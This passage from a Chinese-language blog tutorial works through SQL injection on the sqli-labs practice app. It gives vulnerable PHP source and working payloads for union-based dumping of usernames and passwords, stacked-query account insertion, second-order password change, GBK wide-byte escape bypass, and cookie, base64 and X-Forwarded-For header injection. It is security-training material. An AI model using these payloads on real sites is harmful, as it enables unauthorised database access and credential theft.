class="line">include(&quot;../sql-connections/db-creds.inc&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-38 **stacked Query**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity</span><br><span class="line">//mysql connections for stacked query examples.</span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);</span><br><span class="line">// Check connection</span><br><span class="line">if (mysqli_connect_errno($con1))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database: $dbname&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;&#x27;1 and &#x27;1&#x27;=&#x27;1&#x27;--+ LIMIT 0,1&quot;;</span><br><span class="line">/* execute multi query */</span><br><span class="line">if (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    /* store first result set */</span><br><span class="line">    if ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        if($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;	</span><br><span class="line">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">//            mysqli_free_result($result);</span><br><span class="line">    &#125;</span><br><span class="line">        /* print divider */</span><br><span class="line">    if (mysqli_more_results($con1))</span><br><span class="line">    &#123;</span><br><span class="line">            //printf(&quot;-----------------\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">     //while (mysqli_next_result($con1));</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">    &#123;</span><br><span class="line">	echo &#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">	print_r(mysqli_error($con1));</span><br><span class="line">	echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">    &#125;</span><br><span class="line">/* close connection */</span><br><span class="line">mysqli_close($con1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-38.jpg&quot; /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="是否存在注入"><a href="#是否存在注入" class="headerlink" title="是否存在注入"></a>是否存在注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=1 --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 %23</span><br><span class="line"> </span><br><span class="line">-1&#x27;;show tables %23</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure>
+<h5 id="获取库名"><a href="#获取库名" class="headerlink" title="获取库名"></a>获取库名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(user(),0x3A,database(),version()) --+</span><br></pre></td></tr></table></figure>
+<p>接着使用使用堆叠语法进行检测</p>
+<h5 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) --+</span><br></pre></td></tr></table></figure>
+<h5 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h5><p>把库里所有的表获取出来，再获取字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where TABLE_NAME=&#x27;users&#x27; limit 0,1) --+</span><br></pre></td></tr></table></figure>
+<h5 id="插入普通账号"><a href="#插入普通账号" class="headerlink" title="插入普通账号"></a>插入普通账号</h5><p>知道表的列的情况下使用 insert into 插入语句进行增加账号。</p>
+<p>如果是管理表就直接添加管理员账号即可登录后台。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;insert into users(id,username,password)values(66,&#x27;蔡徐坤&#x27;,&#x27;小黑子树脂666&#x27;) --+</span><br></pre></td></tr></table></figure>
+<p>访问 id=66即可访问到刚刚添加的账号</p>
+<h5 id="插入mysql管理员账号"><a href="#插入mysql管理员账号" class="headerlink" title="插入mysql管理员账号"></a>插入mysql管理员账号</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;insert into users(id,username,password)values(6666,(select authentication_string from mysql.user limit 1 ),&#x27;食不食油饼&#x27;) --+</span><br></pre></td></tr></table></figure>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入是一种在Web应用程序中广泛存在的安全漏洞形式。</p>
+<p>相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与一次注入攻击漏洞相同的攻击威力。</p>
+<h5 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h5><p>在第一次进行数据库插入数据的时候</p>
+<p>仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 函数对其中的特殊字符进行了转义’</p>
+<p>但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义‘   \’</p>
+<p>但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。</p>
+<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。</p>
+<p>在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据</p>
+<p>没有进行进一步的检验和处理，这样就会造成SQL的二次注入</p>
+<p>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中</p>
+<p>然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">开了gpc add转义函数</span><br><span class="line">输入 admin&#x27; 转义成 admin\&#x27; 插入数据库  数据库将\去掉得到admin&#x27;</span><br><span class="line"></span><br><span class="line">存在&#x27;admin&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">updata</span><br><span class="line"></span><br><span class="line">select * from users where name=&#x27;admin&#x27;&#x27;  二次注入</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/8581772-b024d9bb4acded26.png?imageMogr2/auto-orient/strip|imageView2/2/w/854/format/webp" alt="img"></p>
+<h5 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h5><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829152656226.png" alt="image-20220829152656226" style="zoom:80%;" />    </p>
+<p>mysql_escape_string 函数会将特殊字符进行过滤 如’ 经过转义就成了\\’ 然后用insert into 存入在数据库中。</p>
+<p>在 login.php 查看源码</p>
+<p>登录获取用 mysql_escape_string 对输入的参数进行转义</p>
+<p>转义之后在数据库中查找指定的账号和密码 再传入到 session 里。</p>
+<p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829152726983.png" alt="image-20220829152726983" style="zoom:80%;" /></p>
+<p>在看 pass_change.php 源码</p>
+<p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829152747884.png" alt="image-20220829152747884" style="zoom:80%;" /></p>
+<p>$_SESSION[‘username’] 复制给$username 无任何过滤再带入 UPDATE 语句中造成注入。</p>
+<p>整个流程就是注册脏数据用户，再去更改密码时会触发注入。</p>
+<p>触发注入呢我们就可以更改原有用户的密码</p>
+<p>可以看到二次注入比较隐蔽。通常发生在更改，需要二次带入数据时提交的功能里。</p>
+<h5 id="二次注入测试"><a href="#二次注入测试" class="headerlink" title="二次注入测试"></a>二次注入测试</h5><p>先确定测试的网站是否进行过滤，一般情况下网站都会对输入的参数进行过滤，</p>
+<p>然后寻找可能会带入恶意数据二次使用的地方。</p>
+<p>例如用户注册-&gt;修改密码-&gt;邮箱注册-&gt;修改密码-&gt; 文章添加-&gt;文章编辑</p>
+<p>找一切存在二次使用的功能点。</p>
+<p>二次注入测试 SQL 注入，二次注入多数是字符型注入，所以要注意闭合问题。</p>
+<p>现在注册用户 a’ 再分别注册用户 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; and 1=1 #</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; and 1=2 # </span><br></pre></td></tr></table></figure>
+<p>来可能触发的地方</p>
+<p>二次注入多用于修改其他账号的密码 例如 admin 的密码。</p>
+<p>注册用户 admin’ # 登录修改密码 就能修改 admin 的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>
+<p>闭合 注释</p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h5 id="常见几个url转码"><a href="#常见几个url转码" class="headerlink" title="常见几个url转码"></a>常见几个url转码</h5><p><strong>空格    %20</strong></p>
+<p><strong>‘       %27</strong></p>
+<p><strong>#      %23</strong></p>
+<p><strong>/      %2f</strong></p>
+<p><strong>%09    TAB 键（水平）</strong></p>
+<p><strong>%0a    新建一行</strong></p>
+<p><strong>%0b    TAB 键（垂直）</strong></p>
+<p><strong>%0c    新的一页</strong></p>
+<p><strong>%0d    return 功能</strong></p>
+<p><strong>%a0    空格</strong></p>
+<h5 id="php函数addslashes-gpc"><a href="#php函数addslashes-gpc" class="headerlink" title="php函数addslashes()   gpc"></a>php函数addslashes()   gpc</h5><p>作用：使用反斜线引用字符串</p>
+<p>对以下生效生效：</p>
+<p><strong>单引号：’</strong>     /’</p>
+<p><strong>反斜线：/</strong>     //</p>
+<p><strong>双引号：”</strong>   /“</p>
+<p><strong>空值：NULL</strong>  /NULL</p>
+<p>它会在这些之前加上反斜线，这样单引号就是字符串里面的一个，而没有单引号在代码中的作用</p>
+<p>如何单引号逃逸？</p>
+<ol>
+<li>在反斜线之前再加一个反斜线，这样就把反斜线给转义了</li>
+<li><strong>把反斜线弄没（即宽字节注入）</strong></li>
+</ol>
+<h5 id="宽字节手工注入"><a href="#宽字节手工注入" class="headerlink" title="宽字节手工注入"></a>宽字节手工注入</h5><p>宽字节注入，在 SQL 进行防注入的时候，一般会开启 gpc，过滤特殊字符。</p>
+<p>一般情况下开启 gpc 是可以防御很多字符串型的注入，但是如果数据库编码不对，也可以导致 SQL 防注入绕过，达到注入的目的。</p>
+<p>如果数据库设置宽字节字符集 gbk 会导致宽字节注入，从而逃逸 gpc</p>
+<p>简单理解:数据库编码与 PHP 编码设置为不同的两个编码那么就有可能产生宽字节注入</p>
+<p>深入讲解：要有宽字节注入漏洞，首先要满足数据库后端使用双/多字节解析 SQL语句</p>
+<p>其次还要保证在该种字符集范围中包含低字节位是 0x5C(01011100) 的字符</p>
+<p>初步的测试结果 Big5 和 GBK 字符集都是有的， UTF-8 和 GB2312 没有这种字符（也就不存在宽字节注入）</p>
+<p>gpc 绕过过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27;===(addslashes函数)===&gt;%df%5c%27===(数据库 GBK编码)===&gt;運&#x27;</span><br></pre></td></tr></table></figure>
+<h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>在url编码之后，如果%后面的两个字符的值（十六进制形式）超过了128（ascii码最大表示）</p>
+<p>会默认为GBK形式，而Mysql在进行编码是认为GBK形式两个字符才算一个汉字</p>
+<h6 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h6><p>单引号被反斜线转义：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; --&gt; \&#x27; --&gt; %5C%27 </span><br></pre></td></tr></table></figure>
+<p>当在单引号之前加上%aa时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%aa&#x27; --&gt; %aa\&#x27; --&gt; %aa%5C%27   &#x27;大&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+<p>会认为%aa%5C是一对达到单引号的逃狱</p>
+<h5 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h5><p>从源代码分析，存在漏洞的代码 首先 check_addlashes 是将特殊字符进行过滤</p>
+<p>将’ 变成\\’ mysql_query 设置数据库的编码为 gbk 将 id 参数传入到 SQL 中带入查询</p>
+<p>传入%df%5c%27 da’ 即可逃逸 gpc，故存在宽字节注入。</p>
+<p><img src="C:\Users\19623\AppData\Roaming\Typora\typora-user-images\image-20220806191633158.png" alt="image-20220806191633158"></p>
+<h5 id="黑盒环境下的宽字节攻击"><a href="#黑盒环境下的宽字节攻击" class="headerlink" title="黑盒环境下的宽字节攻击"></a>黑盒环境下的宽字节攻击</h5><p>宽字节检测较为简单 输入%df%27 检测即可或者使用配合 and 1=1 检测即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1%df%27%20and%201=1 --+</span><br></pre></td></tr></table></figure>
+<p> 页面是否存在乱码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1%df%27%20or%20sleep(10)--+ </span><br></pre></td></tr></table></figure>
+<p>页面是否存在延时</p>
+<p>均可以测试存在宽字节注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1%df%27%20union%20select%201,version(),database()--+</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\19623\AppData\Roaming\Typora\typora-user-images\image-20220806191731698.png" alt="image-20220806191731698"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1&#x27;\&#x27; and 1=2 --</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_name =0x7573657273 ) --+</span><br></pre></td></tr></table></figure>
+<h3 id="COOKIE注入"><a href="#COOKIE注入" class="headerlink" title="COOKIE注入"></a><strong>COOKIE</strong>注入</h3><p>COOKIE 注入与 GET、POST 注入区别不大，只是传递的方式不一样。</p>
+<p>GET 在url 传递参数、POST 在 POST 正文传递参数和值，COOKIE 在 cookie 头传值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &quot;get ---&quot;;</span><br><span class="line"></span><br><span class="line">echo $_GET[&#x27;a&#x27;];</span><br><span class="line"></span><br><span class="line">echo &quot;post ---&quot;;</span><br><span class="line"></span><br><span class="line">echo $_POST[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">echo &quot;cookie ---&quot;;</span><br><span class="line"></span><br><span class="line">echo $_COOKIE[&#x27;c&#x27;];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>get 在 url 拦截 即使 提交的方法是 post 只要在 url 拦上都可以传递 get</p>
+<p>post 在正文里 提交的方法必须存在 post</p>
+<p>cookie 有没有 post 都可以</p>
+<h5 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h5><p>在Less20中判断是否提交submit 如果存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_POST[&#x27;submit&#x27;]))</span><br><span class="line">		&#123;</span><br><span class="line">			</span><br><span class="line">			$cookee = $_COOKIE[&#x27;uname&#x27;];</span><br><span class="line">			$format = &#x27;D d M Y - H:i:s&#x27;;</span><br><span class="line">			$timestamp = time() + 3600;</span><br></pre></td></tr></table></figure>
+<p>获取值</p>
+<p>保存到$cookee 中 再拼接到 sql 带入查询。造成注入。</p>
+<h5 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h5><p>主要是看看程序员有没有在cookie中做了一些过滤，我们有没有可趁之机。</p>
+<p>cookie 功能多数用于商城购物车，或者用户登录验证，可以对这些功能模块进行测试</p>
+<p>抓取 cookie 包进行安全测试</p>
+<p>用cookie提交攻击语句可以看是否存在注入</p>
+<p>使用 buspsuite 抓包 改包提交</p>
+<p>输入 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: &#x27; order by 4--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and 1=1 --+ </span><br><span class="line"></span><br><span class="line">uname=admin&#x27; and 1=2 --+ </span><br></pre></td></tr></table></figure>
+<h3 id="Base64-编码注入"><a href="#Base64-编码注入" class="headerlink" title="Base64 编码注入"></a><strong>Base64</strong> 编码注入</h3><p>base64 一般用于数据编码进行传输，例如邮件，也用于图片加密存储在网页中。</p>
+<p>数据编码的好处是，防止数据丢失，也有不少网站使用 base64 进行数据传输，</p>
+<p>如搜索栏 或者 id 接收参数 有可能使用 base64 处理传递的参数。</p>
+<p>在 php 中 base64_encode()函数对字符串进行 base64 编码,既然可以编码也可以进行解码</p>
+<p>base64_decode()这个函数对 base64 进行解码。</p>
+<p>编码解码流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 -&gt;base64 编码-&gt;MQ==-&gt;base64 解密-&gt;1</span><br></pre></td></tr></table></figure>
+<p>base64 编码注入，可以绕过 gpc 注入拦截，因为编码过后的字符串不存在特殊字符</p>
+<p>编码过后的字符串，在程序中重新被解码，再拼接成 SQL 攻击语句再执行，从而形SQL 注入。</p>
+<h5 id="代码中分析-base64-注入"><a href="#代码中分析-base64-注入" class="headerlink" title="代码中分析 base64 注入"></a>代码中分析 <strong>base64</strong> 注入</h5><p>从存在漏洞的代码中，首先判断是否有 POST 的 submit 参数过来如果有</p>
+<p>使用$_COOKIE[‘uname’]获取 cookis 传过来的账号，再拼接到 SQL 带入查询。</p>
+<p>这段代码的意思$cookee = base64_decode($cookee); 将$cookee 传过来的参数进</p>
+<p>行解码，所以$cookee 传递过来的数据必须先进行编码，否则解码不了会导致出错。(‘’)</p>
+<p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220830151637252.png" style="zoom:80%;" /></p>
+<h5 id="黑盒环境下对-base64-编码进行注入"><a href="#黑盒环境下对-base64-编码进行注入" class="headerlink" title="黑盒环境下对 base64 编码进行注入"></a>黑盒环境下对 <strong>base64</strong> 编码进行注入</h5><p>首先观察网站是否存在 base64 编码的数据，例如传递的 id 的值，搜索模块。</p>
+<p>如果存在类似==等，可以用 base64 解码进行测试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;)and 1=1--+ 编码 YWRtaW4nYW5kIDE9MS0tIA==</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;)and 1=2--+ 编码 YWRtaW4nYW5kIDE9Mi0tIA==</span><br></pre></td></tr></table></figure>
+<p>本次测试的页面是 cookie 所以需要 cookie 提交 而且有括号需要闭合</p>
+<p>用 burpsuite 抓包后修改 cookie 参数提交</p>
+<p>第一次提交页面返回存在 admin 第二次提交没有 admin 两个页面返回的结果不相同所以存在 SQL 注入</p>
+<p>本代码存在 mysqli_error 函数所以可以里利用报错注入再进一步获取敏感信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin &#x27;) order by 4#</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220830152046971.png" alt="image-20220830152046971"></p>
+<p>注意闭合方式(‘’)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 &#x27; ) union select 1,database(),user()-- </span><br></pre></td></tr></table></figure>
+<p>注意注释 空格也会被编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; ) union select 1,2,group_concat(user(),0x3A,database(),version())#</span><br></pre></td></tr></table></figure>
+<p>获取库名</p>
+<p>获取security库中的表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 &#x27;) union select 1,2, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)#</span><br></pre></td></tr></table></figure>
+<p>获取users表中的字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; ) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)# </span><br><span class="line"></span><br><span class="line">获取username和password的字段值</span><br><span class="line">-1&#x27;) union select 1,2,(select group_concat(id,username,0x3a,password) from users limit 1)#</span><br><span class="line"></span><br><span class="line">-1&#x27;) union select 1,2,(select group_concat(username,&#x27;:&#x27;,password) from security.users)# </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;)and (updatexml(1,concat(0x7e,(select database()),0x7e),1))--  </span><br></pre></td></tr></table></figure>
+<p>报错信息回显</p>
+<p>进行 base64 编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nKWFuZCAodXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpLDEpKS0tICA=</span><br></pre></td></tr></table></figure>
+<p>提交获取敏感信息。 </p>
+<h3 id="XXF-注入攻击"><a href="#XXF-注入攻击" class="headerlink" title="XXF 注入攻击"></a><strong>XXF</strong> 注入攻击</h3><p>X-Forwarded-For 简称 XFF 头，它代表了客户端的真实 IP，通过修改他的值就可以伪造客户端 IP</p>
+<p>XFF 并不受 gpc 影响，而且开发人员很容易忽略这个 XFF 头，</p>
+<p>不会对 XFF 头进行过滤。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &quot;xff---&quot;.$_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>使用 burpsuite</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-for: 9.9.9.9 </span><br></pre></td></tr></table></figure>
+<p>可以随意设置字符串，如果程序中获取这个值再带入数据库查询 会造成 SQL 注入</p>
+<p>除了 X-Forwarded-For 还有 HTTP_CLIENT_IP 都可以由客户端控制值</p>
+<p>所以服务端接受这两个参数的时候 没有过滤会造成 SQL 注入或者更高的危害</p>
+<h5 id="xff-注入代码分析"><a href="#xff-注入代码分析" class="headerlink" title="xff 注入代码分析"></a><strong>xff</strong> 注入代码分析</h5><p><img src="https://img-blog.csdnimg.cn/91790b4f875c441f90e2e565a21d3230.png#pic_center" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;)</span><br></pre></td></tr></table></figure>
+<p>获取远程客户端的HTTP_X_FORWARDED_FOR的值 </p>
+<p>没有进行过滤拼接SQL语句带入查询造成注入</p>
+<h5 id="在黑盒环境下-xff-注入攻击"><a href="#在黑盒环境下-xff-注入攻击" class="headerlink" title="在黑盒环境下 xff 注入攻击"></a>在黑盒环境下 <strong>xff</strong> 注入攻击</h5><p>在用户登录注册模块在 HTTP 头信息添加 X-Forwarded-for: 9.9.9.9’ </p>
+<p>用户在注册的时候，如果存在安全隐患 会出现错误页面或者报错。</p>
+<p>从而导致注册或者登录用户失败。</p>
+<p>burpsuite 抓包 提交 输入检测语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-for: 127.0.0.1&#x27;and 1=1#</span><br><span class="line"></span><br><span class="line">X-Forwarded-for: 127.0.0.1&#x27;and 1=2#</span><br></pre></td></tr></table></figure>
+<p>两次提交返回不一样 存在 SQL 注入漏洞</p>
+<p>获取敏感信息</p>
